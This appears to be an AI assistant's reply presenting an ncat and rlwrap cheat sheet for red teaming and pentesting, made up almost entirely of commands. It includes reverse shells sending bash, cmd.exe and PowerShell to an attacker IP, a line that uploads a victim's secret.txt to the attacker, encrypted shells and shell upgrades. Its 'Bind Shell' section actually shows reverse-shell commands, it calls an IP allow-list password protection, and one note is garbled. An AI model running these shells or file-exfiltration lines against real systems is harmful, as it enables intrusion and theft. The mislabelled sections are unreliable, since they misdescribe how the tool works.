Here's a **comprehensive, detailed, and fast-to-use `ncat` (Netcat from Nmap) + `rlwrap` cheat sheet**, designed for **red teaming, pentesting, and sysadmin tasks**. This includes real-world usage examples, `rlwrap` integration for improved shell usability, and organized by use-case.

---

# 🧠 Ncat + rlwrap Cheat Sheet

> ✅ Ncat is a feature-rich Netcat replacement from the Nmap project.  
> ✅ `rlwrap` gives you readline editing (arrow keys, history) for better shell UX.

---

## ⚙️ Setup: rlwrap + Ncat Shell

```bash
rlwrap ncat [options]
```

> Use `rlwrap` when getting a shell via reverse or bind — gives tab-completion, arrow key history, etc.

---

## 🚀 Basic Commands

|Purpose|Command|
|---|---|
|Listen on port|`ncat -lvp 4444`|
|Connect to host|`ncat <host> <port>`|
|Bind shell (attacker)|`ncat -lvnp 4444 -e /bin/bash`|
|Reverse shell (target)|`ncat <attacker_ip> 4444 -e /bin/bash`|
|Windows reverse shell|`ncat <attacker_ip> 4444 -e cmd.exe`|
|With rlwrap|`rlwrap ncat -lvp 4444`|

---

## 🎧 Bind Shell

**Attacker:**

```bash
rlwrap ncat -lvnp 4444
```

**Target:**

```bash
ncat <attacker_ip> 4444 -e /bin/bash
```

**Windows (cmd.exe):**

```cmd
ncat <attacker_ip> 4444 -e cmd.exe
```

---

## 🌀 Reverse Shell

**Attacker (Listener):**

```bash
rlwrap ncat -lvnp 4444
```

**Target (Linux):**

```bash
ncat <attacker_ip> 4444 -e /bin/bash
```

**Target (PowerShell):**

```cmd.exe
ncat.exe <attacker_ip> 4444 -e powershell.exe
```
 sometimes try launching it from power shell after input details incases of scheduled task
---

## 🔐 SSL Encrypted Shell

**Start SSL listener:**

```bash
ncat --ssl -lvp 443
```

**Connect with SSL:**

```bash
ncat --ssl <host> 443
```

---

## 📁 File Transfer

**Send a file:**

```bash
ncat -lvnp 4444 < file.txt
```

**Receive a file:**

```bash
ncat <ip> 4444 > file.txt
```

**Upload file from victim:**

```bash
ncat <attacker_ip> 4444 < secret.txt
```

---

## 🧪 Chat Server

**Start a chat server:**

```bash
ncat -lvp 4444
```

**Connect to chat server:**

```bash
ncat <ip> 4444
```

---

## 🌐 HTTP Server With Ncat

```bash
ncat -lvp 8080 --keep-open --exec "/bin/cat index.html"
```

> Sends back `index.html` to browsers like a primitive HTTP server.

---

## 🔁 Port Forwarding / Proxying

**Forward local port to remote host:**

```bash
ncat -l 8080 --sh-exec "ncat target.com 80"
```

**Forward traffic via SOCKS proxy:**

```bash
ncat --proxy <proxy_ip>:<port> --proxy-type socks5 <target> <target_port>
```

---

## 🔒 Password Protected Shell (with SSL)

**Server (attacker):**

```bash
ncat --ssl -lvp 443 --allow <ip> --exec /bin/bash
```

**Client (victim):**

```bash
ncat --ssl <attacker_ip> 443
```

---

## 🧰 rlwrap + Useful Tips

|Trick|Description|
|---|---|
|`rlwrap ncat -lvnp 4444`|Use on listener to get shell history support|
|`alias ncatsh='rlwrap ncat -lvnp 4444'`|Set quick alias for repeated use|
|Use with `-e /bin/sh` if `/bin/bash` is missing||
|Use `python -c 'import pty;pty.spawn("/bin/bash")'` to upgrade shell||

---

## 🧪 Shell Upgrade (Post-Reverse Shell)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 💡 Useful Aliases

```bash
alias rsh="rlwrap ncat -lvnp"
alias rcon="rlwrap ncat"
alias fserve="ncat -lvp 9999 <"
alias frecv="ncat <ip> 9999 >"
```

---

Would you like this cheat sheet as a downloadable PDF or a printable Markdown version?